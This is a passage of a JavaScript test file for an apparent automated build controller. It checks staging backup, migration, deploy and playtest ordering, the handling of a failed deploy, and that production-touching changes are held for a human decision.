        integration: { state: 'done', error: null, skipped: [], selfCheck: { tests: 'passed', fixups: 0, pushedIntegrationBranch: null } },
        plan: { packages: [{ id: 'pk', merged: true, todos: o.cards.map((c) => c.text) }] },
      };
    },
    createAdapter: (name, o) =>
      createAdapter(name, {
        ...o,
        runsRoot,
        spawn: () => assert.fail('nothing is launched locally with staging'),
        fetch: async (url) => {
          h.events.push(`ready ${url}`);
          return { status: 200 };
        },
        now: () => 0,
        sleep: async () => {},
      }),
    playtest: async (o) => {
      h.events.push(`playtest ${o.url}`);
      return {
        ok: true,
        model: 'sonnet',
        modelReason: 'exploratory pass',
        report: { findings: [], scores: [{ milestone: 'core', criterion: 'loads', score: 9 }], journeys: [{ name: 'j', passed: true }], screens: [] },
      };
    },
    shipGate: () => ({ allPassed: false }),
    critic: async () => {
      h.ctl.stop();
      return { ok: true, verdict: 'continue', model: 'opus', modelReason: 'x', milestone: { name: 'core', passed: false, score: 50 }, next: 'core', allPassed: false };
    },
    newRunId: () => RUN_ID,
    now: () => CLOCK,
    setTimer: () => ({}),
    clearTimer: () => {},
    staging: { runCommand: runner.fn, git: git.fn, runsRoot: () => runsRoot },
  };
  h.ctl = createLunasWork(deps);
  const started = await h.ctl.start({ projectId: 'game' });
  assert.equal(started.ok, true, JSON.stringify(started));
  await h.ctl.idle();
  assert.equal(h.stored.phase, 'done');
  return { h, runner, runsRoot };
}

test('controller: migrate -> deploy -> playtest, and the Playtester gets the staging URL', async (t) => {
  const diff = diffOf([{ path: 'supabase/migrations/20261027_quotes.sql', status: 'added', added: ['create table quotes (id int);'] }]);
  const { h, runner, runsRoot } = await oneIteration(t, { diff });
  assert.deepEqual(h.events, ['backup', 'migrate', 'deploy', `ready ${STAGING_URL}`, `playtest ${STAGING_URL}`]);
  assert.equal(runner.calls.find((c) => c.step === 'backup').env.LUNA_BACKUP_DIR, backupDirFor(runsRoot, RUN_ID, 1));
  const manifest = JSON.parse(fs.readFileSync(path.join(backupDirFor(runsRoot, RUN_ID, 1), MANIFEST_FILE), 'utf8'));
  assert.equal(manifest.tag, `luna-work/${RUN_ID}/iter-1`);
  assert.ok(h.stored.log.some((e) => /staging: deploy ok/.test(e.text)));
  assert.deepEqual(h.stored.current.launch, { ok: true });
  assert.equal(h.stored.laps[0].playtestOk, true);
});

test('controller: a staging failure is a card, the Playtester gets no stale app', async (t) => {
  const diff = diffOf([{ path: 'src/app.ts', added: ['x()'] }]);
  const { h } = await oneIteration(t, { diff, fail: { deploy: 'Build failed: missing env' } });
  assert.deepEqual(h.events, ['migrate', 'deploy'], 'no playtest after a failed deploy');
  const card = h.todos.find((x) => /Staging deploy failed/.test(x.text));
  assert.ok(card, 'a staging failure card');
  assert.match(card.details, /missing env/);
  assert.ok(h.stored.log.some((e) => /app did not start: staging deploy failed/.test(e.text)));
  assert.equal(h.stored.laps[0].playtestOk, false);
});

test('controller: a production-touching iteration is asked in the decision queue, nothing runs', async (t) => {
  const diff = diffOf([{ path: 'supabase/functions/pay/index.ts', added: [`const db = "https://${PROD_REF}.supabase.co";`] }]);
  const { h, runner } = await oneIteration(t, { diff });
  assert.deepEqual(runner.calls, []);
  assert.deepEqual(h.events, [], 'no backup, migrate, deploy or playtest');
  const asked = h.stored.decisions.filter((d) => d.kind === 'production');
  assert.equal(asked.length, 1);
  assert.equal(asked[0].status, 'pending');
  assert.equal(asked[0].defaultAnswer, 'reject');
  assert.match(asked[0].detail, new RegExp(PROD_REF));
  assert.ok(h.stored.log.some((e) => /staging: held - touches production/.test(e.text)));
});
